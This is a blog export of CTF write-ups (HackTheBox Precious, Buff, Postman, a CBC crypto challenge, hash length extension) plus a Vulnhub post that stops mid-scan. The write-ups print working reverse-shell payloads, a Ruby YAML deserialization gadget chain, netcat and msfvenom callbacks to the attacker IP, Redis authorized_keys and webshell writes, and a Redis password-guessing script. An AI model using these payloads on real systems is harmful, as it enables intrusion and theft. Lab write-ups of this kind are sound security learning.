{"meta":{"title":"xXxYOLOxXx","subtitle":"xXxYOLOxXx","description":"Explorer for unknown.","author":"xXxYOLOxXx","url":"https://yoloyolo.top","root":"/"},"pages":[{"title":"About","date":"2021-01-16T06:01:15.000Z","updated":"2021-06-03T10:47:09.000Z","comments":true,"path":"about/index.html","permalink":"https://yoloyolo.top/about/index.html","excerpt":"","text":"HQU 2018 Love CTF and Info_Sec yolo-yolo@qq.com"},{"title":"Categories","date":"2021-01-16T06:01:20.000Z","updated":"2021-01-16T06:03:34.000Z","comments":true,"path":"categories/index.html","permalink":"https://yoloyolo.top/categories/index.html","excerpt":"","text":""},{"title":"Links","date":"2021-01-16T06:07:24.000Z","updated":"2021-01-16T06:15:29.000Z","comments":true,"path":"links/index.html","permalink":"https://yoloyolo.top/links/index.html","excerpt":"","text":""},{"title":"Tags","date":"2021-01-16T06:01:18.000Z","updated":"2021-01-16T06:04:53.000Z","comments":true,"path":"tags/index.html","permalink":"https://yoloyolo.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"HackTheBox_Precious","slug":"HackTheBox-Precious","date":"2023-03-02T12:12:08.000Z","updated":"2023-03-02T12:32:06.290Z","comments":true,"path":"2023/03/02/HackTheBox-Precious/","link":"","permalink":"https://yoloyolo.top/2023/03/02/HackTheBox-Precious/","excerpt":"日常记录","text":"日常记录 HackTheBox_Precious 信息收集 端口扫描 1nmap -Pn -sV -T5 -v 10.10.11.189 1234567Nmap scan report for precious.htb (10.10.11.189)Host is up (0.37s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)80&#x2F;tcp open http nginx 1.18.0Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel 路径枚举 未枚举出路径 漏洞利用 访问80端口的WEB服务 1curl http://10.10.11.189/ -I 1234567HTTP&#x2F;1.1 302 Moved TemporarilyServer: nginx&#x2F;1.18.0Date: Thu, 02 Mar 2023 02:20:41 GMTContent-Type: text&#x2F;htmlContent-Length: 145Connection: keep-aliveLocation: http:&#x2F;&#x2F;precious.htb&#x2F; 跳转至域名precious.htb 添加域名解析 1echo -e &quot;10.10.11.189\\tprecious.htb&quot; &gt;&gt; /etc/hosts 使用域名可以进行访问 本地开启HTTP服务 1cd /tmp &amp;&amp; python -m http.server 80 将本地HTTP服务页面转为PDF 1curl http://precious.htb -d &quot;url=http://10.10.*.*/&quot; -o pdf 查看文件EXIF信息 1exiftool pdf 123456789101112131415ExifTool Version Number : 11.16File Name : pdfDirectory : .File Size : 22 kBFile Modification Date&#x2F;Time : 2023:03:02 10:42:26+08:00File Access Date&#x2F;Time : 2023:03:02 10:42:33+08:00File Inode Change Date&#x2F;Time : 2023:03:02 10:42:26+08:00File Permissions : rw-r--r--File Type : PDFFile Type Extension : pdfMIME Type : application&#x2F;pdfPDF Version : 1.4Linearized : NoPage Count : 1Creator : Generated by pdfkit v0.8.6 搜索pdfkit v0.8.6，找到相关漏洞CVE-2022-25765 https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 验证漏洞 1curl http://precious.htb/ -d &quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60id%60&quot; 110.10.11.189 - - [02&#x2F;Mar&#x2F;2023 11:34:00] &quot;GET &#x2F;?name&#x3D;%20uid&#x3D;1001(ruby)%20gid&#x3D;1001(ruby)%20groups&#x3D;1001(ruby) HTTP&#x2F;1.1&quot; 200 - 反弹Shell 1nc -lvnp 9998 1curl http://precious.htb/ -d &quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.*.*%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22%60&quot; 获取tty 1python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27; 1cat /home/ruby/.bundle/config 得到用户henry的账户信息 12---BUNDLE_HTTPS:&#x2F;&#x2F;RUBYGEMS__ORG&#x2F;: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot; SSH登入 12ssh henry@10.10.11.189Q3c1AqGHtoI0aXAYFH 查看flag 12cat /home/henry/user.txt c2495bbeca89a6c2caaabb23a05934a9 权限提升 1sudo -l 12345Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;binUser henry may run the following commands on precious: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;ruby &#x2F;opt&#x2F;update_dependencies.rb 1cat update_dependencies.rb 123456789101112131415161718192021222324252627282930# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;require &quot;yaml&quot;require &#x27;rubygems&#x27;# TODO: update versions automaticallydef update_gems()enddef list_from_file YAML.load(File.read(&quot;dependencies.yml&quot;))enddef list_local_gems Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;endgems_file = list_from_filegems_local = list_local_gemsgems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts &quot;Installed version differs from the one specified in file: &quot; + local_name else puts &quot;Installed version is equals to the one specified in file: &quot; + local_name end end endend YAML.load()存在反序列化漏洞 https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/ 构造能够利用漏洞的yml文件 1cd /tmp; vi /tmp/dependencies.yml 文件内容如下 12345678910111213141516171819---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#x27;Kernel&#x27; method_id: :system git_set: &quot;python3 -c \\&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9997));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\\&quot;&quot; method_id: :resolve 监听端口 1nc -lvnp 9997 触发反序列化漏洞 1sudo /usr/bin/ruby /opt/update_dependencies.rb 获得root权限，查看flag 12cat /root/root.txta6c3884ed3b917b870834758ab46f9f1","categories":[{"name":"WrtiteUp","slug":"WrtiteUp","permalink":"https://yoloyolo.top/categories/WrtiteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"}]},{"title":"Hash_Extend","slug":"Hash-Extend","date":"2023-02-21T11:21:17.000Z","updated":"2023-02-21T12:06:08.000Z","comments":true,"path":"2023/02/21/Hash-Extend/","link":"","permalink":"https://yoloyolo.top/2023/02/21/Hash-Extend/","excerpt":"日常记录","text":"日常记录 pip install hashpumpy MD5, SHA1, SHA256每轮加密块大小为64Byte(512Bits)，其中前56Byte(448Bits)用于存储加密数据，后8Byte(64Bits)用于存储数据Bit位数 SHA512每轮加密块大小为128Byte(1024Bits)，其中前112Byte(896Bits)用于存储加密数据，后16Byte(128Bits)用于存储数据Bit位数 MD5存储数据长度时使用小端排序，SHA1, SHA256, SHA512则使用大端排序 SHA384在使用hashpumpy.pump时会报错 1hashpumpy.error: unsupported hash size 以上Hash算法均基于Merkle-Damgård结构，抽象来看，可以类比于对称加密中的OFB模式，即上一轮的加密结果会作为下一轮加密的输入 以MD5为例 我们要加密明文admin，此时明文长度小于加密块数据长度，则会被填充\\x80\\x00\\x00\\x00... 那么加密块为 1admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00\\x00\\x00\\x00 在完成第一轮加密之后我们会得到这一部分的Hash值，如有后续部分，则这部分Hash将作为输入对后一轮加密进行处理 假设存在一个认证方式，将以下内容作为Cookie username+signature 且signature=MD5(secret+username) 且在校验方法为 MD5(secret+input_username) == signature 我们以Alice身份登入后得到这个Cookie，即 MD5(secret+“Alice”) 如果secret长度已知，假设为6 那么可以得到以下加密块，以及其MD5值 1??????Alice\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00 在加密块后续内容追加内容Bob，则可以将上一部分的MD5作为下一轮加密的输入 1??????Alice\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00Bob 即可得到这部分的MD5值 在进行认证时，可以使用以下用户名以及其相应的MD5 1username&#x3D;&quot;Alice\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00Bob&quot; 服务器在验证身份 1MD5(secert+&quot;Alice\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00Bob&quot;) &#x3D;&#x3D; signature 即完成了哈希扩展攻击，如果服务器对用户名的验证存在不安全的逻辑，那么就有可能越权漏洞","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"Hash","slug":"Hash","permalink":"https://yoloyolo.top/tags/Hash/"}]},{"title":"HackTheBox_Flippin_Bank","slug":"HackTheBox-Flippin-Bank","date":"2023-02-20T10:33:53.000Z","updated":"2023-02-20T10:47:07.000Z","comments":true,"path":"2023/02/20/HackTheBox-Flippin-Bank/","link":"","permalink":"https://yoloyolo.top/2023/02/20/HackTheBox-Flippin-Bank/","excerpt":"Dramatically solved.","text":"Dramatically solved. HackTheBox_Flippin_Bank 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import socketserver import socket, osfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import pad,unpadfrom Crypto.Random import get_random_bytesfrom binascii import unhexlifyfrom secret import FLAGwlcm_msg =&#x27;########################################################################\\n&#x27;+\\ &#x27;# Welcome to the Bank of the World #\\n&#x27;+\\ &#x27;# All connections are monitored and recorded #\\n&#x27;+\\ &#x27;# Disconnect IMMEDIATELY if you are not an authorized user! #\\n&#x27;+\\ &#x27;########################################################################\\n&#x27;key = get_random_bytes(16)iv = get_random_bytes(16)def encrypt_data(data): padded = pad(data.encode(),16,style=&#x27;pkcs7&#x27;) cipher = AES.new(key, AES.MODE_CBC,iv) enc = cipher.encrypt(padded) return enc.hex()def decrypt_data(encryptedParams): cipher = AES.new(key, AES.MODE_CBC,iv) paddedParams = cipher.decrypt( unhexlify(encryptedParams)) print(paddedParams) if b&#x27;admin&amp;password=g0ld3n_b0y&#x27; in unpad(paddedParams,16,style=&#x27;pkcs7&#x27;): return 1 else: return 0def send_msg(s, msg): enc = msg.encode() s.send(enc)def main(s): send_msg(s, &#x27;username: &#x27;) user = s.recv(4096).decode().strip() send_msg(s, user +&quot;&#x27;s password: &quot; ) passwd = s.recv(4096).decode().strip() send_msg(s, wlcm_msg) msg = &#x27;logged_username=&#x27; + user +&#x27;&amp;password=&#x27; + passwd try: assert(&#x27;admin&amp;password=g0ld3n_b0y&#x27; not in msg) except AssertionError: send_msg(s, &#x27;You cannot login as an admin from an external IP.\\nYour activity has been logged. Goodbye!\\n&#x27;) raise msg = &#x27;logged_username=&#x27; + user +&#x27;&amp;password=&#x27; + passwd send_msg(s, &quot;Leaked ciphertext: &quot; + encrypt_data(msg)+&#x27;\\n&#x27;) send_msg(s,&quot;enter ciphertext: &quot;) enc_msg = s.recv(4096).decode().strip() try: check = decrypt_data(enc_msg) except Exception as e: send_msg(s, str(e) + &#x27;\\n&#x27;) s.close() if check: send_msg(s, &#x27;Logged in successfully!\\nYour flag is: &#x27;+ FLAG) s.close() else: send_msg(s, &#x27;Please try again.&#x27;) s.close()class TaskHandler(socketserver.BaseRequestHandler): def handle(self): main(self.request)if __name__ == &#x27;__main__&#x27;: socketserver.ThreadingTCPServer.allow_reuse_address = True server = socketserver.ThreadingTCPServer((&#x27;0.0.0.0&#x27;, 1337), TaskHandler) server.serve_forever() CBC字节翻转？ 一眼CBC字节翻转 看一半发现IV不可控 CBC密码块构造 想了一下可以构造伪密码块 CBC大概加解密流程如下 1Plain_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Block Cipher Encrypt -&gt; Cipher_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Plain_Block 题目中的所需密码块如下 123 Plain_Block_0 Plain_Block_1 Plain_Block_2 logged_username&#x3D; admin&amp;password&#x3D;g 0ld3n_b0yIV Cipher_Block_0 Cipher_Block_1 Cipher_Block_2 Key, IV, Plain_Block_0固定，则Cipher_Block_0固定 攻击思路如下 123target = Plain_Block_1 ^ Cipher_Block_0Cipher_Block_1 = encrypt(target)Cipher_Block_2 = encrypt(Plain_Block_2 ^ Cipher_Block_1) 我们可以在Plain_Block_1与Plain_Block_2中间插入Plain_Block_Payload 并且满足以下条件 12Cipher_Block_Payload = encrypt(Plain_Block_Payload ^ Cipher_Block_1)Cipher_Block_Payload == Cipher_Block_1 在这种情况下则有 123Cipher_Block_Payload == Cipher_Block_1Cipher_Block_Payload ^ Plain_Block_2 == Cipher_Block_1 ^ Plain_Block_2encrypt(Cipher_Block_Payload ^ Plain_Block_2) == encrypt(Cipher_Block_1 ^ Plain_Block_2) == Cipher_Block_2 即我们可以获得Get Flag情况下Cipher_Block_2的内容 但是Plain_Block_Payload该如何构造？ Payload明文密码块构造 1234Cipher_Block_Payload == Cipher_Block_1encrypt(Plain_Block_Payload ^ Cipher_Block_1) == encrypt(Plain_Block_1 ^ Cipher_Block_0)Plain_Block_Payload ^ Cipher_Block_1 == Plain_Block_1 ^ Cipher_Block_0Plain_Block_Payload == Plain_Block_1 ^ Cipher_Block_0 ^ Cipher_Block_1 所需的三个条件已知，所以我们可以很轻松的得到Plain_Block_Payload Encode &amp; Decode 将构造的内容用pwntools发出后没有收到响应 多次调试后发现问题所在 12send_msg(s, user +&quot;&#x27;s password: &quot; )passwd = s.recv(4096).decode().strip() 本地生成算出Payload Hex形式后转字符串是用ISO-8859-1编码，这个单字节编码在处理\\x7a以上的字符时很好用，所以顺手就用这个编码去处理Payload了 但是问题随之而来 1UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xa6 in position 15: invalid start byte 也就是意味着我的Payload需要能够被UTF-8编码处理 WTF? Guessing Game 所以现在所能做的，就只有去修改Plain_Block_1的内容 Plain_Block_1内容如下: 1?????&amp;password&#x3D;? 爆破六位掩码，这会影响Cipher_Block_1的结果 由于AES加密过程的扩散性，我们可以将Cipher_Block_1的结果看成是随机的 我们所需要的结果是Payload_Block_Payload的16字节均小于\\x80，这样UTF-8编码就能处理 概率为1/65536，但值得一试 我们再理一遍思路 原始密码块如下 123 Plain_Block_0 Plain_Block_1 Plain_Block_2 logged_username&#x3D; admin&amp;password&#x3D;g 0ld3n_b0yIV Cipher_Block_0 Cipher_Block_1 Cipher_Block_2 我们需要的XOR结果如下 1target = Cipher_Block_0 ^ Plain_Block_1 现在我们开始爆破Plain_Block_1，可以得到Tmp_Cipher_Block_1 123 Plain_Block_0 Tmp_Plain_Block_1 Tmp_Plain_Block_Payload Plain_Block_2 logged_username&#x3D; ?????&amp;password&#x3D;? ???????????????? 0ld3n_b0yIV Cipher_Block_0 Tmp_Cipher_Block_1 Tmp_Cipher_Block_Payload Cipher_Block_2 得到的Tmp_Cipher_Block_1视为随机生成，可以轻松得到Tmp_Plain_Block_Payload 1Tmp_Plain_Block_Payload = Tmp_Cipher_Block_1 ^ target 我们所需要确保的，就是这个Tmp_Plain_Block_Payload可以被UTF-8编码处理 在爆破出Tmp_Plain_Block_Payload之后，由于Tmp_Cipher_Block_Payload与Cipher_Block_1相等，Cipher_Block_2为预期值 输入Cipher_Block_0 + Tmp_Cipher_Block_Payload + Cipher_Block_2即可获得Flag 😅 不需要验证前面的&quot;logged_username=&quot;是吧 直接字节翻转就完事了 密码块如下 1logged_username&#x3D; Admin&amp;password&#x3D;g 0ld3n_b0y 12decrypt(Block_Cipher_1)[0] == &quot;A&quot; ^ Block_Cipher_0[0]New_Block_Cipher_0[0] = &quot;A&quot; ^ &quot;a&quot; ^ Block_Cipher_0[0] 代入得到 1decrypt(Block_Cipher_1)[0] == &quot;a&quot; 难怪做的有点费劲，原来是非预期了啊😅，感觉这个思路都能出个题了都","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"CBC","slug":"CBC","permalink":"https://yoloyolo.top/tags/CBC/"}]},{"title":"HackTheBox_Buff","slug":"HackTheBox-Buff","date":"2023-02-14T15:29:28.000Z","updated":"2023-02-14T15:30:33.000Z","comments":true,"path":"2023/02/14/HackTheBox-Buff/","link":"","permalink":"https://yoloyolo.top/2023/02/14/HackTheBox-Buff/","excerpt":"迟来的文章","text":"迟来的文章 HackTheBox_Buff 2020/07/27 16:23:58 前期工作 连接服务器，服务器连接代理 网络状态 靶机 信息收集 端口扫描 nmap -sT -Pn --top-port 1000 -sV -T5 10.10.10.198 Web路径扫描 gobuster dir -w /usr/share/wordlists/directory-list-2.3-medium.txt -x .php -u http://10.10.10.198:8080/ 漏洞利用 代理浏览器 proxychains firefox 得到CMS相关信息 搜索相关漏洞 searchsploit Gym 1.0 执行EXP proxychains python 48506.py http://10.10.10.198:8080/ 获取Shell 权限提升 服务器开启HTTP服务 pythom -m SimpleHTTPServer 9900 下载nc与plink 12curl -O http:&#x2F;&#x2F;10.10.16.4:9900&#x2F;nc.execurl -O http:&#x2F;&#x2F;10.10.16.4:9900&#x2F;plink.exe 使用nc反弹shell 12nc -lvnp 9999nc.exe -e cmd.exe 10.10.16.4 9999 后台进程中发现CloudMe tasklist | findstr CloudMe 该进程在本地开启了8888端口 netstat -ano | findstr 2556 使用plink进行端口转发 plink.exe -R 9901:127.0.0.1:8888 root@10.10.16.4 -pw YOUR_PASSWORD 查看服务器端口 netstat -antlp | grep 9901 搜索相关漏洞 searchsploit cloudme 使用EXP 44470.py 12searchsploit -m 44470.pycat 44470.py 使用msfvenom构造payload msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f c 修改payload，且修改端口为9901之后上传EXP至服务器 scp 44470.py root@hk:/root/ 监听端口4444 nc -lvnp 4444 执行EXP python 44470.py 提权成功 查看flag","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"}]},{"title":"HackTheBox_Postman","slug":"HackTheBox-Postman","date":"2023-02-14T15:22:53.000Z","updated":"2023-02-14T15:29:17.000Z","comments":true,"path":"2023/02/14/HackTheBox-Postman/","link":"","permalink":"https://yoloyolo.top/2023/02/14/HackTheBox-Postman/","excerpt":"迟来的文章","text":"迟来的文章 HackTheBox_Postman 2020/01/15 19:55:48 信息收集 端口扫描 nmap -sV -Pn -p 1-10000 -T5 -n -v -A 10.10.10.160 123456789101112131415Nmap scan report for 10.10.10.160Host is up (0.29s latency).Not shown: 9326 closed ports, 672 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))6379/tcp open redis Redis key-value store 4.0.910000/tcp open http MiniServ 1.910 (Webmin httpd)|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: MiniServ/1.910|_http-title: Site doesn&#x27;t have a title (text/html; Charset=iso-8859-1).Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (92%), Android 4.1.2 (92%), Android 4.2.2 (Linux 3.4) (92%)No exact OS matches for host (test conditions non-ideal). Web路径枚举 尝试爆破80端口下的Web路径 未发现有效信息 漏洞利用 尝试直接登入redis服务 1redis-cli -h 10.10.10.160 利用redis未授权写入ssh密钥，再用ssh登入redis账户 123456789rm -rf ~&#x2F;.ssh&#x2F;id*ssh-keygen -t rsa(echo -e &quot;\\n\\n&quot;;cat ~&#x2F;.ssh&#x2F;id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; new.txtredis-cli -h 10.10.10.160 flushallcat new.txt | redis-cli -h 10.10.10.160 -x set crackitredis-cli -h 10.10.10.160 config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh&#x2F;redis-cli -h 10.10.10.160 config set dbfilename &quot;authorized_keys&quot;redis-cli -h 10.10.10.160 savessh -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa redis@10.10.10.160 无法在/var/www/html/目录下写入WebShell 发现文件/opt/id_rsa.bak 1234ls -l &#x2F;opttotal 4-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak 可以确定是Matt账户的ssh密钥 拷贝到本地之后再用脚本转为john可以破解的密码形式 123&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa.bak &gt; sshjohn --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ssh computer2008 得到Matt账户的口令，使用SSH登入Matt账户 12ssh Matt@10.10.10.160computer2008 权限提升 在MSF中搜索Webmin的相关漏洞 12345678910111213search webminMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary&#x2F;admin&#x2F;webmin&#x2F;edit_html_fileaccess 2012-09-06 normal No Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access 1 auxiliary&#x2F;admin&#x2F;webmin&#x2F;file_disclosure 2006-06-30 normal No Webmin File Disclosure 2 exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution 3 exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor 4 exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_show_cgi_exec 2012-09-06 excellent Yes Webmin &#x2F;file&#x2F;show.cgi Remote Command Execution 5 exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_upload_exec 2019-01-17 excellent Yes Webmin Upload Authenticated RCE MSF中调用漏洞利用工具 12345678use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rceset payload cmd&#x2F;unix&#x2F;reverse_netcatset LHOST 10.10.16.14set RHOSTS 10.10.10.160set USERNAME Mattset PASSWORD computer2008set SSL truerun 获取root权限 12iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) Redis登入之后，可以考虑写入一句话后门/phpinfo这个思路 1234config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;config set dbfilename shell.phpset webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;save 而这台靶机中无法在/var/www/html/目录下写入文件，提权也比较困难，只能写入SSH密钥 附： Redis弱口令探测脚本 123456789101112131415161718192021222324252627# -*- coding:utf-8 -*-import socketimport sysPASSWORD_DIC&#x3D;[&#39;redis&#39;,&#39;root&#39;,&#39;oracle&#39;,&#39;password&#39;,&#39;p@aaw0rd&#39;,&#39;abc123!&#39;,&#39;123456&#39;,&#39;admin&#39;]def check(ip, port, timeout): try: socket.setdefaulttimeout(timeout) s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(&quot;INFO\\r\\n&quot;) result &#x3D; s.recv(1024) if &quot;redis_version&quot; in result: return u&quot;未授权访问&quot; elif &quot;Authentication&quot; in result: for pass_ in PASSWORD_DIC: s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(&quot;AUTH %s\\r\\n&quot; %(pass_)) result &#x3D; s.recv(1024) if &#39;+OK&#39; in result: return u&quot;存在弱口令，密码：%s&quot; % (pass_) except Exception, e: passif __name__ &#x3D;&#x3D; &#39;__main__&#39;: ip&#x3D;sys.argv[1] port&#x3D;sys.argv[2] print check(ip,port, timeout&#x3D;10) nmap扫描速度巨慢，而且总是会扫漏几个端口，甚至扫全端口时总是会中途因为900s的数据包延迟而中断扫描…(体验极差) Redis的操作完全没有接触过，十分生疏 Webmin的漏洞利用倒是异常的顺利 参考资料 redis wp","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"}]},{"title":"Vulnhub_JANGOW_1.0.1","slug":"Vulnhub-JANGOW-1-0-1","date":"2023-02-14T11:59:27.000Z","updated":"2023-02-14T15:21:56.000Z","comments":true,"path":"2023/02/14/Vulnhub-JANGOW-1-0-1/","link":"","permalink":"https://yoloyolo.top/2023/02/14/Vulnhub-JANGOW-1-0-1/","excerpt":"Vulnhub年靶机数量 Year Num … … 2018 65 2019 117 2020 223 2021 108 2022 1 难免对于一个时代的落幕感到惋惜 但同时庆幸自己能够在最好的时间参与其中 在学习的过程中享受这个过程 Thank you, Vulnhub &amp; every author. Thank you for what I learned and every wonderful challenge I enjoyed.","text":"Vulnhub年靶机数量 Year Num … … 2018 65 2019 117 2020 223 2021 108 2022 1 难免对于一个时代的落幕感到惋惜 但同时庆幸自己能够在最好的时间参与其中 在学习的过程中享受这个过程 Thank you, Vulnhub &amp; every author. Thank you for what I learned and every wonderful challenge I enjoyed. JANGOW: 1.0.1 2023-02-14 06:59:27 信息收集 IP探测 nmap -sn 192.168.56.0/24 | grep -B 2 Virtual 123Nmap scan report for 192.168.56.118Host is up (0.00010s latency).MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC) 端口扫描 nmap -sV -Pn -v -T5 -A 192.168.56.118 12345678910111213141516171819202122232425Nmap scan report for 192.168.56.118Host is up (0.00016s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.380/tcp open http Apache httpd 2.4.18| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD| http-ls: Volume /| SIZE TIME FILENAME| - 2021-06-10 18:05 site/|_|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Index of /MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9Uptime guess: 